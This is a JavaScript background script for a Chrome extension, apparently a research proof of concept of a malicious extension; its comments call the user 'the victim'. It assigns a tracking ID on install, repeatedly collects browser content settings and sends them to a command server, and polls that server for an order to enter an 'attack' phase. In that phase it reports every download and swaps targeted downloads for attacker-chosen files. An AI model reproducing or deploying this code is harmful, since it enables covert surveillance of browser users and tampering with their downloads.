//START, UID CREATION, PHASE STATE

/*
The UId of the user is create in base of the time of first installation in UTC,
this date is put in a simple SHASH for obtaining an unique and ofuscate id

This UID is stored locally, but could be stored in sync for better knowdleged of the victim

The UID do not change with updates or by shuting the extension, only if the extension is removed
the UID would be lost

In the other hand, the phase state is restarted with updates of the extension, but this should not be a problem

*/


chrome.runtime.onInstalled.addListener(function setuid(){
    const First_installed = Date.now().toString();
    console.log(First_installed)
    //https://stackoverflow.com/questions/521295/seeding-the-random-number-generator-in-javascript
    function cyrb128(str) {
        let h1 = 1779033703, h2 = 3144134277,
            h3 = 1013904242, h4 = 2773480762;
        for (let i = 0, k; i < str.length; i++) {
            k = str.charCodeAt(i);
            h1 = h2 ^ Math.imul(h1 ^ k, 597399067);
            h2 = h3 ^ Math.imul(h2 ^ k, 2869860233);
            h3 = h4 ^ Math.imul(h3 ^ k, 951274213);
            h4 = h1 ^ Math.imul(h4 ^ k, 2716044179);
        }
        h1 = Math.imul(h3 ^ (h1 >>> 18), 597399067);
        h2 = Math.imul(h4 ^ (h2 >>> 22), 2869860233);
        h3 = Math.imul(h1 ^ (h3 >>> 17), 951274213);
        h4 = Math.imul(h2 ^ (h4 >>> 19), 2716044179);
        return [((h1^h2^h3^h4)>>>0).toString()];
    }
    const value = cyrb128(First_installed);
    var a = false;
    chrome.storage.local.get(["uid"]).then( (result)=>{
        
        
        if (result.uid == undefined ){
            chrome.storage.local.set({uid:value});

            fetch('http://127.0.0.1:5000/extadd',
            {
            method: 'POST',
            mode: 'no-cors', 
            body: JSON.stringify({"uid": value}),
            headers:{"Content-Type": "application/json"}
            })

        }
    
    });
    chrome.storage.local.set({phase:0});


})


//INFO (POC_Detective and Extension combined)

/*
In short words, calls to relevant APIs asking for information that could help indentify the victim

In general all of this calls are not relevant and should not take the attention of the system if they are
not done commonly.

(for short periods an Alarm is used, for longer periods, that is,
     months a local storage solution with dates shall be used)
*/
function logCPU(C){
    fetch('http://127.0.0.1:5000/control_server',
            {
            method: "POST",
            mode: 'no-cors', 
            body: JSON.stringify( C),
            headers:{"Content-Type": "application/json"}
            }
    )
    }
function logExApp(C){

    fetch('http://127.0.0.1:5000/control_server',
    {
    method: "POST",
    mode: 'no-cors', 
    body: JSON.stringify( C),
    headers:{"Content-Type": "application/json"}
    }
)   
}

function loggingcontentSettings(){

    var S={};

    chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){S.Cookies = details.setting;});
    chrome.contentSettings.images.get({primaryUrl:'http://*'},function(details){S.Images = details.setting;});
    chrome.contentSettings.javascript.get({primaryUrl:'http://*'},function(details){S.JavaScript = details.setting;});
    chrome.contentSettings.location.get({primaryUrl:'http://*'},function(details){S.Location = details.setting;});
    chrome.contentSettings.plugins.get({primaryUrl:'http://*'},function(details){S.Plugins = details.setting;});
    chrome.contentSettings.popups.get({primaryUrl:'http://*'},function(details){S.Popups = details.setting;});
    chrome.contentSettings.notifications.get({primaryUrl:'http://*'},function(details){S.Notifications = details.setting;});
    chrome.contentSettings.fullscreen.get({primaryUrl:'http://*'},function(details){S.FullScreen = details.setting;});
    chrome.contentSettings.mouselock.get({primaryUrl:'http://*'},function(details){S.MouseLock = details.setting;});
    chrome.contentSettings.microphone.get({primaryUrl:'http://*'},function(details){S.Microphone = details.setting;});
    chrome.contentSettings.camera.get({primaryUrl:'http://*'},function(details){S.Camera = details.setting;});
    chrome.contentSettings.unsandboxedPlugins.get({primaryUrl:'http://*'},function(details){S.UnsandboxedPlugins = details.setting;});
    chrome.contentSettings.automaticDownloads.get({primaryUrl:'http://*'},function(details){S.AutomaticDownloads = details.setting;});
    console.log(S)
    setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
    
        S.uid = result.uid.toString();
        number = 1;
        fetch(`http://127.0.0.1:5000/extadd/${number}`,
        {
        method: "POST",
        mode: 'no-cors',
        body: JSON.stringify(S),
        headers:{"Content-Type": "application/json"}
        })
        
        })},1500);    


}

function loggingprivacySettings(){

    var S='';

    chrome.privacy.services.alternateErrorPagesEnabled.get({},function(details){S+='alternateErrorPagesEnabled : '+details.value + " " + details.levelOfControl  +' ';});
    chrome.privacy.services.safeBrowsingEnabled.get({},function(details){S+='safeBrowsingEnabled : '+details.value +  " " + details.levelOfControl +' ';});
    
    
    chrome.privacy.websites.hyperlinkAuditingEnabled.get({},function(details){S+='hyperlinkAuditingEnabled : '+details.value + " " + details.levelOfControl +' ';});
    chrome.privacy.websites.doNotTrackEnabled.get({},function(details){S+='doNotTrackEnabled : '+details.value + " " + details.levelOfControl +' ';});
    chrome.privacy.websites.protectedContentEnabled.get({},function(details){S+='protectedContentEnabled : '+details.value + " " + details.levelOfControl +' ';});
    
    setTimeout(function(){   fetch('http://127.0.0.1:5000/control_server',
    {
    method: "POST",
    mode: 'no-cors', 
    body: JSON.stringify(S),
    headers:{"Content-Type": "application/json"}
    });},1500);    


}


//chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){console.log(details)});
//https://stackoverflow.com/questions/53026387/how-to-get-all-chrome-content-settings

chrome.alarms.create("info",{ periodInMinutes: 0.07 });

chrome.alarms.onAlarm.addListener((Alarm)=>{
    if (Alarm.name == "info"){
        //chrome.system.cpu.getInfo((info)=>{logCPU(info)})
        //chrome.management.getAll((info)=>{logExApp(info)})
        //chrome.downloads.search({}).then(logExApp) 
        //chrome.proxy.settings.get({'incognito': false}).then((info)=> logExApp(info))
        
        loggingcontentSettings()
        //loggingprivacySettings();


    }
    })





//WAIT (GET request)
/*
In a regular basis the system ask the server if it should change mode to attack version,
the GET request will be done with the uid of the victim

The change of mode will happen by desired of the attacker when an interesting target has been 
indentifie.

(for short periods an Alarm is used, for longer periods, that is,
     months a local storage solution with dates shall be used)
*/




chrome.alarms.create("phase",{ periodInMinutes: 5});
//https://stackoverflow.com/questions/60727329/chrome-extension-rejection-use-of-permissions-all-urls

chrome.alarms.onAlarm.addListener((Alarm) => {

    if (Alarm.name == "phase"){
        chrome.storage.local.get(["uid"]).then( (result)=>{
        result = result.uid.toString()
        console.log(result)
        fetch(`http://127.0.0.1:5000/req/${result}`,
            {
            method: "GET",
            mode: 'no-cors', 
            headers:{"Content-Type": "application/json"}
            }).then(r => r.text()).then(result => {
                if(result == "2"){
                    chrome.storage.local.set({phase:1});
                };
                if(result == "4"){
                    chrome.storage.local.set({phase:0});
                };
            });})

    }

})

//ATTACK (Download API)







function modify(item){
    chrome.storage.local.get(["phase"]).then((result)=>{
        console.log(result)
        if(result.phase == 1){
        fetch('http://127.0.0.1:5000/control_server',
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify(item),
        headers:{"Content-Type": "application/json"}
        })
        if (item.url.includes("1024px-Wikipedia-logo-v2.svg.png")){
        chrome.downloads.cancel(item.id)
        chrome.downloads.download({url: "https://en.wikipedia.org/wiki/Gender_bias_on_Wikipedia#/media/File:Wikipedia_Monument_2.JPG"});
        }
    }});
 
}


//https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg/800px-Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg
//chrome.downloads.onChanged.addListener((Delta)=>{FileOpen(Delta)})

chrome.downloads.onCreated.addListener((Item)=>{modify(Item)})